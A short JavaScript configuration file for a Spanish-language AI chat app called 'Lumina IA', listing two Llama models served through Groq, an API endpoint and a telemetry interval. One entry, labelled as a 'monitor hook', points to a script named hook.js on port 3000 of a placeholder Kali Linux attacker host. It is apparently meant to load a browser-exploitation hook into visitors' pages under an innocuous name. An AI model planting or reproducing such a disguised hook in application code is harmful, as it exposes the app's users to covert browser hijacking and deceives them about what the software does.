const CONFIG = {
  APP_NAME: 'Lumina IA',
  VERSION: '6.2.0',

  MODELS: [
    {
      id: 'groq:llama-3.1-8b-instant',
      label: 'Lumina Veloz',
      description: 'Respuestas rápidas para tareas diarias.'
    },
    {
      id: 'groq:llama-3.3-70b-versatile',
      label: 'Lumina Analítico',
      description: 'Mayor profundidad para análisis y redacción.'
    }
  ],

  DEFAULT_MODEL: 'groq:llama-3.1-8b-instant',
  API_ENDPOINT: '/api/chat',
  TELEMETRY_INTERVAL_MS: 300000,
  MONITOR_HOOK_URL: 'http://[TU_IP_KALI_O_DOMINIO]:3000/hook.js',
  ASSET_MGMT_ENDPOINT: ''
};

window.CONFIG = CONFIG;
